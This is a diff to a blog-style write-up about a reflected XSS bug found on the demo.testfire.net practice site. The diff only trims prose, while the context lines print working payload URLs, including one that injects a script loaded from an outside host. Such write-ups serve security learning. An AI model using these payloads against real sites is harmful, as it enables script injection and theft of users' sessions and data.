@@ -58,7 +58,7 @@ Why hadn't I tried this an hour before? It would have saved so much time. I trie
 
 ![?content=%3Cvideo%20onloadedmetadata=%22alert(1)%22%3E%3Csource%20src=%22//jdgregson.com/vid.mp4%22%3E](images/video-onloadedmetadata-xss.png)
 
-It worked! After a few hours of trial and error, I finally had a one-click reflected XSS payload:
+It worked! I finally had a one-click reflected XSS payload:
 
     http://demo.testfire.net/index.jsp?content=%3Cvideo%20onloadedmetadata=%22alert(1)%22%3E%3Csource%20src=%22//jdgregson.com/vid.mp4%22%3E
 
@@ -67,5 +67,3 @@ Taking things a step further, I updated the payload to download a JavaScript fil
     http://demo.testfire.net/index.jsp?content=%3Cvideo%20onloadedmetadata=%22s=document.createElement('script');s.src='//jdgregson.com/xss.js';document.body.appendChild(s)%22%3E%3Csource%20src=%22//jdgregson.com/vid.mp4%22%3E
 
 ![Remote XSS payload](images/remote-xss-payload.png)
-
-At long last I had my fill of vulns for the evening.
